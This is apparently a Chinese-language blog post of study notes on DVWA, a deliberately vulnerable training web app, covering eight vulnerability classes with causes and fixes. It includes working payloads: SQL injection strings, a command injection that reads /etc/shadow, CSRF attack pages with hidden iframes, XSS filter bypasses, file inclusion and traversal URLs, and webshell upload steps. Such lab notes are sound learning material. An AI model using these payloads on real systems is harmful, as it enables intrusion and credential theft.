@@ -1,0 +1,273 @@
+---
+layout: post
+title:  "DVWA"
+date:   2018-05-14 20:20:00
+categories: web_server 
+tags: web security
+---
+
+* content
+{:toc}
+
+![intro](http://image.3001.net/images/20161223/14824834848133.png!small)
+
+[作业部落记录](https://www.zybuluo.com/ranger-01/note/1051825)
+
+
+
+
+## 1. 暴力破解（brute force）
+
+### 原因：
+
+1. 对用书输入（用户名和密码）没有做检查，黑客可以sql注入
+	
+		```php
+		# 通过$user这个参数的值，使SQL语句换了个样子
+		$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";
+		Username:admin’ or ’1′=’1  
+		Username :admin’ #
+
+		Password:（空）
+		```
+
+2. 对登陆失败次数没有限制，黑客可以用burpsuit等工具暴力破解
+
+### 方案：
+Django：
+
+1. django 的ORM会检测输入
+2. 用redis的TTL来[防止暴力破解](https://segmentfault.com/q/1010000007211329)
+    ![image_1c6uo5iug1tve3iovg51jk5111u9.png-43.8kB][1]
+
+PHP:
+
+mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击
+
+	```
+	$pass=$_POST['password'];
+	$pass=stripslashes($pass);
+	$pass=mysql_real_escape_string($pass);
+	$pass=md5($pass);
+	```
+
+## 2. 命令行注入(command injection)
+
+### 原因： 
+对输入没有做检查。window和linux系统都可以用&&来执行多条命令
+
+	```php
+	$target = $_REQUEST[ 'ip' ]; 
+	$cmd = shell_exec( 'ping  ' . $target ); 
+	输入：127.0.0.1&&cat /etc/shadow
+	```
+	
+- Command 1&&Command 2
+
+    先执行Command 1，执行成功后执行Command 2，否则不执行Command 2
+	
+- Command 1&Command 2
+
+    先执行Command 1，不管是否成功，都会执行Command 2
+	
+- Command 1 \| Command 2
+
+    “\|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。
+
+### 方案：
+对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞
+
+## 3. 跨站请求伪造（CSRF）
+
+### 原因：
+1. 修改数据用的是GET请求
+
+		```php
+		$pass_new  = $_GET[ 'password_new' ]; 
+		$pass_conf = $_GET[ 'password_conf' ]; 
+		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
+
+		# 上传一个攻击页面，诱骗受害者去访问 test.html
+		<img src="http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>
+
+		<h1>404<h1>
+
+		<h2>file not found.<h2>
+		```
+	
+- 中级难度：会检查host和referer。
+把页面命名为192.168.153.130.html
+![image_1c709mj4k1sbtm5n1cbvnb81gs4m.png-69.2kB][2]
+
+- 高级难度：每次访问页面，server会返回token，发请求时需要带这个token
+
+		```javascript
+		<script type="text/javascript">
+
+			function attack()
+
+		  {
+
+		   document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;
+
+		  document.getElementById("transfer").submit(); 
+
+		  }
+
+		</script>
+
+		 
+
+		<iframe src="http://192.168.153.130/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">
+
+		</iframe>
+
+		 
+
+		<body onload="attack()">
+
+		  <form method="GET" id="transfer" action="http://192.168.153.130/dvwa/vulnerabilities/csrf">
+
+		   <input type="hidden" name="password_new" value="password">
+
+			<input type="hidden" name="password_conf" value="password">
+
+		   <input type="hidden" name="user_token" value="">
+
+		  <input type="hidden" name="Change" value="Change">
+
+		   </form>
+
+		</body>
+		```
+	
+攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。
+然而理想与现实的差距是巨大的，这里牵扯到了跨域问题.
+
+所以需要用xss攻击，先获取token：
+
+- 现在这个网站一个类似留言板块进行存储型XSS攻击
+- 其他人访问这个页面，会触发这个XSS发送token（或者直接触发CSRF的脚本）
+- 拿到token后就可以进行CSRF
+
+
+### 方案：
+每次修改密码时，带原始密码
+
+## 4. 跨站脚本攻击(XSS)
+
+### 原因：
+没有对输入进行检测
+
+```
+# 反射型
+ echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
+# 存储型（发表评论）
+$message = trim( $_POST[ 'mtxMessage' ] ); 
+$name    = trim( $_POST[ 'txtName' ] ); 
+$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
+
+ 输入:
+ <script>alert(/xss/)</script>
+ <sc<script>ript>alert(/xss/)</script>
+ <ScRipt>alert(/xss/)</script>
+ <img src=1 onerror=alert(/xss/)>
+```
+
+### 方案：
+htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。
+
+```
+checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+// Get input 
+$name = htmlspecialchars( $_GET[ 'name' ] ); 
+// Feedback for end user 
+echo "<pre>Hello ${name}</pre>"; 
+```
+
+## 5. SQL注入（SQL injection）
+
+### 原因：
+没有对用户输入进行检测。通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的
+
+- 盲注：
+
+	与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知。
+
+- 手工盲注:
+
+	就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。
+
+```
+// Get input 
+$id = $_REQUEST[ 'id' ]; 
+
+// Check database 
+$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
+
+// 输入:
+1’or ‘1234 ’=’1234
+1′ or 1=1 order by 1 #
+```
+
+### 方案：
+1. 检测输入，去除如单引号，#号这些特殊字符；最好是用类似ORM，省时省力
+
+## 6. 不安全的验证码(insecure captcha)
+
+### 原因：
+修改密码的时候，把check 验证码和改密码分解为了两个动作
+
+### 方案：
+合并成一步，改密码时，同时输入验证码
+
+## 7. File inclusion
+
+![image_1c71foli1q44lk519v6poe145213.png-19.6kB][3]
+![image_1c71g3nji8nc1jggen8fmf19p71g.png-79.1kB][4]
+
+### 原因：
+你想用户点击这几个按钮（url的page参数是你想的那几个），并执行这个文件（如果是php）或者返回这个文件内容。但是用户可以修改page后面的参数成其他路径，或者远程路径。这就造成了任意文件获取和任意命令执行
+
+```
+http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:\xampp\htdocs\dvwa\php.ini
+http://192.168.153.130/dvwa/vulnerabilities/fi/page=..\..\..\..\..\..\..\..\..\xampp\htdocs\dvwa\php.ini%0012.php
+http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt
+```
+
+### 方案：
+检查file后面的参数，只能是我显示的那几个文件名的字符。
+
+## 8. File upload
+
+### 原因： 
+通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的
+
+文件上传漏洞的利用是有限制条件的：
+
+1. 首先当然是要能够成功上传木马文件，
+2. 其次上传文件必须能够被执行，
+3. 最后就是上传文件的路径必须可知
+
+攻击方法：
+
+- 先上传一句话木马
+- 在用中国菜刀去访问这个木马文件
+
+### 方案：
+
+- 对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则）
+- 同时对文件的内容作了严格的检查（从image图像以filename为文件名创建一个JPEG图像），导致攻击者无法上传含有恶意脚本的文件
+
+## 参考
+- [新手指南DVWA](http://www.freebuf.com/author/lonehand)
+
+- [讲dvwa的:](https://github.com/ethicalhack3r/DVWA)
+
+- [django 安全实践：](http://www.atjiang.com/2scoopsdjango1.8-26-security-best-practices/)
+
+
+  [1]: http://static.zybuluo.com/ranger-01/o6wgtv1pqeh873bozrg0l6qy/image_1c6uo5iug1tve3iovg51jk5111u9.png
+  [2]: http://static.zybuluo.com/ranger-01/nqvybqwl145cy6yvor399hxj/image_1c709mj4k1sbtm5n1cbvnb81gs4m.png
+  [3]: http://static.zybuluo.com/ranger-01/zdtkgh5fvwcajzyrqax8588b/image_1c71foli1q44lk519v6poe145213.png
+  [4]: http://static.zybuluo.com/ranger-01/58pq7gdh9uin3414uxylgdcn/image_1c71g3nji8nc1jggen8fmf19p71g.png
